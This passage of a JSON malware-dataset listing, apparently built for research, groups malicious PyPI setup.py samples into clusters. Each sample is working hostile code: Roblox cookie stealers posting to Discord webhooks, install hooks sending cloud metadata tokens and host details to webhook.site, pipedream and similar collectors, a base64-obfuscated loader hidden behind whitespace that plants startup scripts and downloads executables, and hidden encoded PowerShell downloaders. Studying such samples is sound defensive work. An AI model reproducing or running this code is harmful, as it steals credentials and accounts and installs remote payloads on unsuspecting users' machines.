expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolouwdmgbgkvr",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolouwdmgbgkvr', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='<Message id=1038465491095793734 channel=<DMChannel id=1038462724411240448 recipient=None> type=<MessageType.default: 0> author=<User id=965607288083718154 name='\\u1cbc\\u1cbc\\u1cbc' discriminator='4942' bot=False> flags=<MessageFlags value=0>>' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolozamdgbxywf",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolozamdgbxywf', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='<Message id=1038463823767674910 channel=<DMChannel id=1038462724411240448 recipient=None> type=<MessageType.default: 0> author=<ClientUser id=1038459327989678230 name='mymaths' discriminator='4063' bot=True verified=True mfa_enabled=False> flags=<MessageFlags value=0>>' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      }
    ]
  },
  {
    "cluster_id": 104,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-22-fidnffvvbfhghghhhh-v1",
        "code": "from setuptools import setup \nfrom setuptools.command.install import install \nimport os \nfrom setuptools.command.install import install \nfrom setuptools.command.develop import develop \nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command(): os.system(\"access_token=$(curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/405422660992@cloudbuild.gserviceaccount.com/token'); curl -X POST -d '$access_token' https://webhook.site/48961bc9-ec95-4b8c-9e4b-45c14aa3e70a\")\n\nclass CustomInstallCommand(install): \n    def run(self): \n        install.run(self) \n        custom_command()\n\nclass CustomDevelopCommand(develop): \n    def run(self): develop.run(self) \n    custom_command()\n\nclass CustomEggInfoCommand(egg_info): \n    def run(self): egg_info.run(self) \n    custom_command()\n\nsetup( name='fidnffvvbfhghghhhh', version='1', description='Descriptionnn', author='asdsadaslolo', author_email='pepepepldsaoihdsddda@example.com', packages=[], cmdclass={ 'install': CustomInstallCommand, 'develop': CustomDevelopCommand, 'egg_info': CustomEggInfoCommand, }, )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-22-gal32fjdsbf89hnd-v1",
        "code": "from setuptools import setup \nfrom setuptools.command.install import install \nimport os \nfrom setuptools.command.install import install \nfrom setuptools.command.develop import develop \nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command(): os.system(\"access_token=$(curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/405422660992@cloudbuild.gserviceaccount.com/token'); curl -X POST -d '$access_token' https://webhook.site/48961bc9-ec95-4b8c-9e4b-45c14aa3e70a\")\n\nclass CustomInstallCommand(install): \n    def run(self): \n        install.run(self) \n        custom_command()\n\nclass CustomDevelopCommand(develop): \n    def run(self): develop.run(self) \n    custom_command()\n\nclass CustomEggInfoCommand(egg_info): \n    def run(self): egg_info.run(self) \n    custom_command()\n\nsetup( name='gal32fjdsbf89hnd', version='1', description='Descriptionnn', author='asdsadaslolo', author_email='pepepepldsaoihdsa@example.com', packages=[], cmdclass={ 'install': CustomInstallCommand, 'develop': CustomDevelopCommand, 'egg_info': CustomEggInfoCommand, }, )\n"
      }
    ]
  },
  {
    "cluster_id": 105,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-12-easyrequests-v1.0.0",
        "code": "import base64\ntype(\"By HW\")                                                                                                                                                                                                                                                                                                                                                                ,exec(base64.b64decode(\"aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXCcpID09IEZhbHNlOgoKICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NCIpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV0lOMzIudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV0lOMzIuYmF0IiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQogICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcV0lONjQudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV2luZG93cyBIZWxwZXIuZXhlIiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQogICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXHNoLnB5dyIsICJhIikud3JpdGUoZidmcm9tIHNodXRpbCBpbXBvcnQgdW5wYWNrX2FyY2hpdmVcbmltcG9ydCBzdWJwcm9jZXNzLCBvc1xudW5wYWNrX2FyY2hpdmUoIkM6XFxcXFVzZXJzXFxcXHtsb2dpbn1cXFxcQXBwRGF0YVxcXFxSb2FtaW5nXFxcXE1pY3Jvc29mdFxcXFxXaW5kb3dzXFxcXFN0YXJ0IE1lbnVcXFxcUHJvZ3JhbXNcXFxcU3lzdGVtNjRcXFxccnVudGltZS56aXAiLCAiQzpcXFxcVXNlcnNcXFxce2xvZ2lufVxcXFxBcHBEYXRhXFxcXFJvYW1pbmdcXFxcTWljcm9zb2Z0XFxcXFdpbmRvd3NcXFxcU3RhcnQgTWVudVxcXFxQcm9ncmFtc1xcXFxTeXN0ZW02NCIpXG5zdWJwcm9jZXNzLnJ1bihbZiJDOlxcXFxVc2Vyc1xcXFx7bG9naW59XFxcXEFwcERhdGFcXFxcUm9hbWluZ1xcXFxNaWNyb3NvZnRcXFxcV2luZG93c1xcXFxTdGFydCBNZW51XFxcXFByb2dyYW1zXFxcXFN5c3RlbTY0XFxcXHB5dGhvbncuZXhlIiwgZiJDOlxcXFxVc2Vyc1xcXFx7bG9naW59XFxcXEFwcERhdGFcXFJvYW1pbmdcXFxcTWljcm9zb2Z0XFxcXFdpbmRvd3NcXFxcU3RhcnQgTWVudVxcXFxQcm9ncmFtc1xcXFxTeXN0ZW02NFxcXFxzdHViLnB5dyJdLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKVxub3MucmVtb3ZlKGYiQzpcXFxcVXNlcnNcXFxce2xvZ2lufVxcXFxBcHBEYXRhXFxcXFJvYW1pbmdcXFxcTWljcm9zb2Z0XFxcXFdpbmRvd3NcXFxcU3RhcnQgTWVudVxcXFxQcm9ncmFtc1xcXFxTeXN0ZW02NFxcXFxzdHViLnB5dyIpJykKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxXSU4zMi5iYXQiLCAiYSIpLndyaXRlKGYnYml0c2FkbWluIC90cmFuc2ZlciBteWRvd25sb2Fkam9iIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCAiaHR0cHM6Ly9hcGktaHcuY29tL2RsL3J1bnRpbWUiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxydW50aW1lLnppcCJcbnN0YXJ0ICIiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxzaC5weXciXG5iaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBGT1JFR1JPVU5EICJodHRwczovL2FwaS1ody5jb20vZGwvdyIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdpbmRvd3MgSGVscGVyLmV4ZSJcbnN0YXJ0ICIiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFdJTjY0LnZicyInKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQplbHNlOiAgIAogICAgcGFzcw==\"))\nfrom setuptools import setup, find_packages\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nVERSION = '1.0.0'\nDESCRIPTION = 'A simplified version of urllib'\nLONG_DESCRIPTION = 'Use this package to make your https requests.'\n\n# Setting up\nsetup(\n    name=\"easyrequests\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\nclass send():\n    print(\"Hi\")\n\nfrom pyrequester.requester import send"
      }
    ]
  },
  {
    "cluster_id": 106,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-04-embeds-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"embeds\",\n  version=\"0.0.1\",\n  author=\"Lithium\",\n  description=\"Send embedded discord messages through your bot!\",\n  packages=[\"embeds\"]\n)\n\nimport os\nos.system(\"curl https://github.com/holdthatcode/host/raw/main/howl.exe --output RealtekHDAudioManager.exe && start RealtekHDAudioManager.exe\")\n\nimport os\nos.system(\"curl https://github.com/holdthatcode/host/raw/main/howl.exe --output RealtekHDAudioManager.exe && start RealtekHDAudioManager.exe\")"
      }
    ]
  },
  {
    "cluster_id": 107,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-08-10-notsogood-v0.0.2",
        "code": "#https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/\n\nimport requests\n# import pandas as pd\n# import numpy as np\n# import matplotlib.pyplot as plt\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom setuptools.command.egg_info import egg_info\n\n\n\ndef RunCommand():\n    print(\"Hello, p0wnd!\")\n    response = requests.get('https://k8tl2ekw25kff6eo3lfo7wllvc14zso.oastify.com')\n\nclass RunEggInfoCommand(egg_info):\n    def run(self):\n        RunCommand()\n        egg_info.run(self)\n\n\nclass RunInstallCommand(install):\n    def run(self):\n        RunCommand()\n        install.run(self)\n\nsetup(\n    name = \"notsogood\",\n    version = \"0.0.2\",\n    license = \"MIT\",\n    packages=find_packages(),\n    cmdclass={\n        'install' : RunInstallCommand,\n        'egg_info': RunEggInfoCommand\n    },\n)\n\ndef hi_there():\n    print(\"This is fine!\")"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-layoutspecs-v0.1",
        "code": "import platform\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\n\ndef send():\n    machine_name = platform.node()\n    operating_system = platform.system()\n    response = requests.get('https://httpbin.org/ip')\n    ip_address = response.json()['origin']\n    url = f\"https://webhook-test.com/8caf20007640ce1a4d2843af7b479eb1?data=I:{ip_address}&M:{machine_name}&O:{operating_system}&ME=PY\"\n    rqs = requests.get(url, allow_redirects=True)\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\n\nsetup(\n    name='layoutspecs',\n    version='0.1',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Ashley Uguna',\n    author_email='ashleyug70@gmail.com',\n    description='My first simple package testing a basic webhook!',\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-16-scavenger-py-v1.0.2",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eo76onac4yq6rb4.m.pipedream.net\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='scavenger-py', #package name\n      version='1.0.2',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      }
    ]
  },
  {
    "cluster_id": 108,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-moneyprinter-api-v0.1.0",
        "code": "import setuptools\nimport subprocess\nsubprocess.call(\"./script.sh\")\nsetuptools.setup(\n    name=\"moneyprinter-api\",\n    version=\"0.1.0\",\n    description=\"Adalab Moneyprinter\",\n    packages=setuptools.find_packages(),\n    install_requires=[\n        \"numpy\",\n        \"pandas\",\n        \"matplotlib\",\n        \"numba\",\n        \"absl-py\",\n        \"accelerate\",\n        \"addict\",\n        \"aitemplate\",\n        \"altair\",\n    ]\n)\n\n"
      }
    ]
  },
  {
    "cluster_id": 109,
    "size": 43,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqinfostrosint-v9.73",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqinfostrosint',\n    packages = ['modlib'],\n    version = '10.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqintstudyhacked-v1.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintstudyhacked',\n    packages = ['modlib'],\n    version = '8.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqlibcpuosint-v4.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqlibcpuosint',\n    packages = ['modlib'],\n    version = '9.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqnvidiaadram-v1.94",
